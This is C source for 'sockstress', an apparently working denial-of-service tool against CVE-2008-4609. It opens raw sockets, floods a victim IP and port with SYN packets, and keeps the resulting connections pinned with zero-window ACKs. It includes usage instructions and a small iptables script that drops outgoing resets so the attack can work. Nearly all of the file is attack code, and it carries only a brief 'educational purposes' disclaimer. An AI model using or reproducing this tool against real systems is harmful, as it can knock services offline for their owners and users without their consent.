/*
 *     _____  ____   _____ _  __ _____ _______ _____  ______  _____  _____ 
 *    / ____|/ __ \ / ____| |/ // ____|__   __|  __ \|  ____|/ ____|/ ____|
 *   | (___ | |  | | |    | ' /| (___    | |  | |__) | |__  | (___ | (___  
 *    \___ \| |  | | |    |  <  \___ \   | |  |  _  /|  __|  \___ \ \___ \
 *    ____) | |__| | |____| . \ ____) |  | |  | | \ \| |____ ____) |____) |
 *   |_____/ \____/ \_____|_|\_\_____/   |_|  |_|  \_\______|_____/|_____/ 
 *                         
 *                            CVE-2008-4609
 *                   https://defuse.ca/sockstress.htm
 * 
 *                         By: havoc@defuse.ca
 *                         Date: April 9, 2012
 *
 *         This code is explicitly placed into the public domain.

 * THIS CODE IS PROVIDED FOR EDUCATIONAL AND ETHICAL SECURITY TESTING PURPOSES 
 * ONLY. THE AUTHOR IS NOT RESPONSIBLE FOR ILLEGAL USE OF, OR DAMAGE CAUSED 
 * BY, THIS CODE. There is NO WARRANTY, to the extent permitted by law.
 * 
 * Compile: gcc -Wall -c sockstress.c
 *          gcc -pthread -o sockstress sockstress.o
 *
 * Usage: ./sockstress <ip>:<port> <interface> [-p payload] [-d delay]
 *     <ip>             Victim IP address
 *     <port>           Victim port
 *     <interface>      Local network interface (e.g. eth0)
 *     -p payload       File containing data to send after connecting
 *                      Payload can be at most 1000 bytes
 *     -d delay         Microseconds between SYN packets (default: 10000
 *     -h               Help menu
 *
 * You MUST configure iptables to drop the reset packets sent by the local OS 
 * in response to the incoming acks: ./drop_rst.sh xx.xx.xx.xx
 * --- BEGIN drop_rst.sh ---
   #!/bin/bash
   if [ $# -eq 0 ] ; then
       echo "Usage: ./drop_rst.sh <remote_ip>"
       exit 1
   fi
   iptables -A OUTPUT -p tcp --tcp-flags rst rst -d $1 -j DROP
 * --- END drop_rst.sh ---
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <time.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>

#include <pthread.h>

#define DEBUG_MODE 0 // Set to 1 to enable extremely verbose output
#define DEFAULT_SYN_DELAY (10 * 1000) // 10ms
#define IP_PROT_TCP 6
#define MAX_PAYLOAD_SIZE 1000

#pragma pack(push)
#pragma pack(1)
struct ip_header {
    unsigned char ver_ihl; 
    unsigned char type_of_service;
    uint16_t length; 
    uint32_t line2; // don't care about these bits
    unsigned char ttl;
    unsigned char protocol;
    uint16_t checksum;
    uint32_t source_addr;
    uint32_t dest_addr;
    uint32_t options;
};
struct tcp_header {
    uint16_t src_port;
    uint16_t dest_port;
    uint32_t seq;
    uint32_t ack;
    uint16_t off_res_flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urg_ptr;
    uint32_t opts_pad;
};
#pragma pack(pop)

static const char *optString = "h?p:d:";

struct globalArgs_t {
    uint16_t attack_port;
    struct in_addr attack_ip;
    struct sockaddr_in iface_addr;
    int syn_delay;
    unsigned char payload[MAX_PAYLOAD_SIZE];
    size_t payload_size;
} globalArgs;

struct packetStats_t {
    unsigned long syn_sent;
    unsigned long ack_sent;
    unsigned long synack_recv;
    unsigned long ack_recv;
    unsigned long rst_recv;
} packetStats;


void *process_incoming(void *ptr);
void *send_syns(void *ptr);
int get_iface_ip(struct sockaddr_in *ip, char *iface);
void calc_tcp_checksum(unsigned char *packet, unsigned long packet_length, struct in_addr src, struct in_addr dst);
void send_ack(unsigned char *packet);
void *print_status(void *ptr);
void printUsage(char *msg);
void initStats(void);
void processArgs(int argc, char **argv);
void loadPayload(char *path);
void printIntro(void);


int sockstress_main(int argc, char **argv)
{
    srand(time(NULL));

    printIntro();
    initStats();
    processArgs(argc, argv);

    // Start the packet processor
    pthread_t packet_processor;
    pthread_create(&packet_processor, NULL, process_incoming, NULL);

    // Start the syn flood thread
    pthread_t syn_sender;
    pthread_create(&syn_sender, NULL, send_syns, NULL);

    pthread_t status_update;
    pthread_create(&status_update, NULL, print_status, NULL);

    // Wait for the threads to return, which is never.
    pthread_join(syn_sender, NULL);
    pthread_join(packet_processor, NULL);
    pthread_join(status_update, NULL);

    return 0;
}

void printIntro(void)
{
    puts("SOCKSTRESS - CVE-2008-4609 | havoc@defuse.ca");
}

void printUsage(char *msg)
{
    if(msg != NULL)
        printf("[!] %s\n", msg);
    puts("Usage: ./sockstress <ip>:<port> <interface> [-p payload] [-d delay]");
    puts("\t<ip>\t\tVictim IP address");
    puts("\t<port>\t\tVictim port");
    puts("\t<interface>\tLocal network interface (e.g. eth0)");
    puts("\t-p payload\tFile containing data to send after connecting");
    printf("\t\t\tPayload can be at most %d bytes\n", MAX_PAYLOAD_SIZE);
    printf("\t-d delay\tMicroseconds between SYN packets (default: %d)\n", DEFAULT_SYN_DELAY);
    puts("\t-h\t\tHelp menu");
    puts("\n **You must configure your firewall to drop TCP reset packets sent to <ip>**");
    exit(-1);
}

void initStats(void)
{
    packetStats.syn_sent = 0;
    packetStats.ack_sent = 0;
    packetStats.synack_recv = 0;
    packetStats.ack_recv = 0;
    packetStats.rst_recv = 0;
}

void processArgs(int argc, char **argv)
{
    globalArgs.attack_port = 0;
    globalArgs.syn_delay = DEFAULT_SYN_DELAY;
    globalArgs.payload_size = 0;

    int opt = 0;
    while((opt = getopt(argc, argv, optString)) != -1)
    {
        switch(opt)
        {
            case 'p':
                loadPayload(optarg);
                break;
            case 'd':
                globalArgs.syn_delay = atoi(optarg);
                if(globalArgs.syn_delay == 0)
                    printUsage("Invalid delay.");
                break;
            case 'h':
            case '?':
                printUsage(NULL);
            default:
                break;
        }
    }

    char **remArgv = argv + optind;
    int remArgc = argc - optind;
    if(remArgc > 2)
        printUsage("Too many arguments.");
    if(remArgc < 2)
        printUsage("Too few arguments.");

    int ip_index = 0;
    int iface_index = 1;

    // If they put the interface before the ip:port, swap the indexes. 
    if(get_iface_ip(&globalArgs.iface_addr, remArgv[iface_index]) == 0)
    {
        ip_index = 1;
        iface_index = 0;
        if(get_iface_ip(&globalArgs.iface_addr, remArgv[iface_index]) == 0)
            printUsage("Invalid interface.");
    }

    char *ip = remArgv[ip_index];
    char *port = remArgv[ip_index];
    while(*port != ':' && *port != '\0')
        port++;
    if(*port == '\0')
        printUsage("Please specify a port.");
    *port = '\0';
    port++;

    globalArgs.attack_port = atoi(port);
    if(globalArgs.attack_port == 0)
        printUsage("Invalid port.");

    if(inet_aton(ip, &globalArgs.attack_ip) == 0)
        printUsage("Invalid IP address.");

    printf("[+] Sending packets from %s (%s)\n", remArgv[iface_index], inet_ntoa(globalArgs.iface_addr.sin_addr));
    printf("[+] Attacking: %s:%hu...\n", ip, globalArgs.attack_port);
}

void loadPayload(char *path)
{
    FILE *file = fopen(path, "rb");
    if(file == NULL)
        printUsage("Error reading payload file.");
    globalArgs.payload_size = fread(globalArgs.payload, sizeof(unsigned char), MAX_PAYLOAD_SIZE, file);
    if(ferror(file))
        printUsage("Error reading payload file.");
}

void *print_status(void *ptr)
{
    if(DEBUG_MODE)
        return NULL;
    while(1)
    {
        printf("[+] SENT: syn: %lu ack: %lu RECV: synack: %lu ack: %lu rst: %lu\r",
                packetStats.syn_sent, packetStats.ack_sent, packetStats.synack_recv, packetStats.ack_recv, packetStats.rst_recv);
        fflush(stdout);
        sleep(1);
    }
}

void *send_syns(void *ptr)
{
    int s_out = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s_out < 0)
    {
        perror("[!] Error creating socket to send SYNs");
        exit(-1);
    }
    if(bind(s_out, (struct sockaddr*)&globalArgs.iface_addr, sizeof(struct sockaddr_in)) == -1)
    {
        perror("[!] Error binding socket to send SYNs");
        exit(-1);
    }
    struct tcp_header tcp;
    struct sockaddr_in attack_addr;
    attack_addr.sin_family = AF_INET;
    attack_addr.sin_addr = globalArgs.attack_ip;
    while(1)
    {
        tcp.src_port = (rand() & 0xFFFF) | 0x8000;
        tcp.dest_port = htons(globalArgs.attack_port);
        tcp.seq = htonl(rand()); 
        tcp.ack = 0;

        tcp.off_res_flags = 0;
        // set data offset
        tcp.off_res_flags |= htons(0x6000); 
        // set syn flag
        tcp.off_res_flags |= htons(0x0002);

        tcp.window = 1000;
        tcp.urg_ptr = 0;
        tcp.opts_pad = 0;

        calc_tcp_checksum((unsigned char*)&tcp, sizeof(struct tcp_header), globalArgs.iface_addr.sin_addr, attack_addr.sin_addr);

        int ret = sendto(s_out, &tcp, sizeof(struct tcp_header), 0, 
                (struct sockaddr*)&attack_addr, sizeof(struct sockaddr_in));
        if(ret == -1)
            perror("[!] Error sending SYN packet");
        packetStats.syn_sent++;
        usleep(globalArgs.syn_delay); 
    }

}

void send_ack(unsigned char *packet)
{
    if(DEBUG_MODE)
        printf("[d] ---SENDING ACK...\n");
    static int s_out = -1;

    if(s_out == -1)
    {
        if(DEBUG_MODE)
            printf("[d] Initializing ACK socket...\n");
        s_out = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s_out < 0)
        {
            perror("[!] Error creating socket to send ACK/SYNACK");
            exit(-1);
        }
        if(bind(s_out, (struct sockaddr*)&globalArgs.iface_addr, sizeof(struct sockaddr_in)) == -1)
        {
            perror("[!] Error binding socket to send ACK/SYNACK");
            exit(-1);
        }
    }

    struct sockaddr_in attack_addr;
    attack_addr.sin_family = AF_INET;
    attack_addr.sin_addr = globalArgs.attack_ip;

    struct ip_header *ip = (struct ip_header*)packet;
    struct tcp_header *synack = (struct tcp_header*)(packet + 4*(ip->ver_ihl & 0x0F));

    unsigned char reply[sizeof(struct tcp_header) + MAX_PAYLOAD_SIZE];
    struct tcp_header *ack = (struct tcp_header*)reply;
    ack->src_port = synack->dest_port;
    ack->dest_port = synack->src_port;
    ack->ack = synack->seq; // Only add 1 if it's a synack (done below)
    ack->seq = synack->ack; 

    ack->off_res_flags = 0;
    // set data offset
    ack->off_res_flags |= htons(0x6000);
    // set ack flag
    ack->off_res_flags |= htons(0x0010);

    ack->window = 0; // zero window to make the other side wait
    ack->urg_ptr = 0;
    ack->opts_pad = 0;

    // If the received packet is a SYNACK, attach the payload
    unsigned long packet_size = sizeof(struct tcp_header);
    if(synack->off_res_flags & htons(0x0010) && synack->off_res_flags & htons(0x0002))
    {
        ack->ack = htonl(ntohl(synack->seq) + 1);
        ack->seq = synack->ack;
        memcpy(reply + sizeof(struct tcp_header), globalArgs.payload, globalArgs.payload_size);
        packet_size += globalArgs.payload_size;
    }

    calc_tcp_checksum(reply, packet_size, globalArgs.iface_addr.sin_addr, attack_addr.sin_addr);
    int ret = sendto(s_out, reply, packet_size, 0,
            (struct sockaddr*)&attack_addr, sizeof(struct sockaddr_in));
    if(ret == -1)
        perror("[!] Error sending ACK/SYNACK packet");
}

// Thread for processing incoming packets
void *process_incoming(void *ptr)
{
    int s_listen = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if(s_listen < 0)
    {
        perror("[!] Error creating socket to process incoming packets");
        exit(-1);
    }

    struct sockaddr_in localhost;
    localhost.sin_family = AF_INET;
    localhost.sin_addr.s_addr = INADDR_ANY;

    bind(s_listen, (struct sockaddr*)&localhost, sizeof(localhost));
    unsigned char packet_buffer[10000];

    while(1)
    {
        int count = recv(s_listen, packet_buffer, 10000, 0);
        struct ip_header *ip = (struct ip_header*)packet_buffer;
        struct tcp_header *tcp = (struct tcp_header*)(packet_buffer + 4*(ip->ver_ihl & 0x0F));

        if(ip->source_addr == globalArgs.attack_ip.s_addr && ip->protocol == IP_PROT_TCP) 
        {
            struct in_addr src_addr;
            src_addr.s_addr = ip->source_addr;

            int urg, ack, psh, rst, syn, fin;
            urg = tcp->off_res_flags & htons(0x0020);
            ack = tcp->off_res_flags & htons(0x0010); 
            psh = tcp->off_res_flags & htons(0x0008);
            rst = tcp->off_res_flags & htons(0x0004); 
            syn = tcp->off_res_flags & htons(0x0002);
            fin = tcp->off_res_flags & htons(0x0001);
            if(DEBUG_MODE)
            {
                printf("[d] Got %d byte TCP packet from %s\n", count, inet_ntoa(src_addr));
                printf("[d]\t SEQ: %lx    ACK: %lx\n", (long)ntohl(tcp->seq), (long)ntohl(tcp->ack));
                printf("[d]\t SRC: %d     DST: %d\n", (int)ntohs(tcp->src_port), (int)ntohs(tcp->dest_port));
                printf("[d]\t IP CHECKSUM %lx   TCP CHECKSUM %lx\n", (long)ip->checksum, (long)tcp->checksum);
                printf("[d]\t FLAGS: ");
                if(urg)
                    printf("URG ");
                if(ack)
                    printf("ACK ");
                if(psh)
                    printf("PSH ");
                if(rst)
                    printf("RST ");
                if(syn)
                    printf("SYN ");
                if(fin)
                    printf("FIN ");
                printf("\n[d]\t WINDOW: %d", tcp->window);
                printf("\n");
            }

            // Complete the connection
            if(syn && ack)
            {
                packetStats.synack_recv++;
                send_ack(packet_buffer);
                packetStats.ack_sent++;
            }
            // Keep it alive
            else if(ack)
            {
                packetStats.ack_recv++;
                send_ack(packet_buffer);
                packetStats.ack_sent++;
            }
            else if(rst)
            {
                packetStats.rst_recv++;
            }

        }
    }
}

#define ADD_16BIT_OVERFLOW(x) x = (x + (1&(x >> 16))) & 0xFFFF;

void calc_tcp_checksum(unsigned char *packet, unsigned long packet_length, struct in_addr src, struct in_addr dst)
{

    uint32_t checksum = 0;

    // Pseudo Header
    uint32_t source_ip = ntohl(src.s_addr);
    uint32_t dest_ip = ntohl(dst.s_addr);

    // Source Address
    checksum += (source_ip >> 16) & 0xFFFF;
    ADD_16BIT_OVERFLOW(checksum);
    checksum += source_ip & 0x0000FFFF;
    ADD_16BIT_OVERFLOW(checksum);

    // Destination Address
    checksum += (dest_ip >> 16) & 0xFFFF;
    ADD_16BIT_OVERFLOW(checksum);
    checksum += dest_ip & 0x0000FFFF;
    ADD_16BIT_OVERFLOW(checksum);

    // zero||protocol
    checksum += 0x0006;
    ADD_16BIT_OVERFLOW(checksum);

    //TCP length
    checksum += packet_length;
    ADD_16BIT_OVERFLOW(checksum);

    // Set the checksum field to 0
    struct tcp_header *tcp = (struct tcp_header*)packet;
    tcp->checksum = 0;

    int i;
    for(i = 0; i < packet_length / 2; i++)
    {
        // Read the 16-bit word in the correct endianness
        uint16_t block = (packet[i * 2] << 8) | packet[i * 2 + 1];
        checksum += block;
        ADD_16BIT_OVERFLOW(checksum);
    }

    if(packet_length % 2 == 1)
    {
        uint16_t last_block = packet[packet_length-1] << 8;
        checksum += last_block;
        ADD_16BIT_OVERFLOW(checksum);
    }

    // actual checksum is the one's compliment of the one's compliment sum
    tcp->checksum = htons(~checksum);
}

int get_iface_ip(struct sockaddr_in *ip, char *iface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    int ret = ioctl(fd, SIOCGIFADDR, &ifr);
    if(ret != 0)
    {
        return 0;
    }
    close(fd);
    ip->sin_family = AF_INET;
    ip->sin_addr = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr;
    return 1; 
}

